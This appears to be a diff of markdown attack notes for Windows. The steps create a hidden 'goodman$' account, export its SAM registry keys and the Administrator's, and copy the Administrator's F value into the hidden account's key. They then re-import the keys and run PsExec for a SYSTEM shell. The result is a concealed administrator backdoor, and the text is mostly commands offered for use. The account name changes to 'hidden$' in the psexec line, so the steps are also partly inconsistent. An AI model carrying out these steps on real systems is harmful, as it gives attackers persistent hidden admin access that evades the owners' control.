@@ -9,10 +9,12 @@
 1. net user goodman$ <passwd> /add
 1. Export regedit 
     1. sam\domains\account\users\names\goodman$ as name.reg
-    1. sam\domains\account\users\<admimistrator_id> as rource.reg
-    1. sam\domains\account\users\<goodman$____id> as target.reg
+    1. sam\domains\account\users\<admimistratorID> as source.reg
+    1. sam\domains\account\users\<goodman$ID> as target.reg
 1. Delete goodman$ account
-1. Import sam and user reg: regedit /s <xxx>.reg
+1. Copy F=hex value from source.reg to target.reg
+1. Import name and target reg
+    1. regedit /s <xxx>.reg
 1. Us PSexec to get system cmd
     1. psexec -u hidden$ -p <passwd> cmd
     1. psexec -i-s cmd
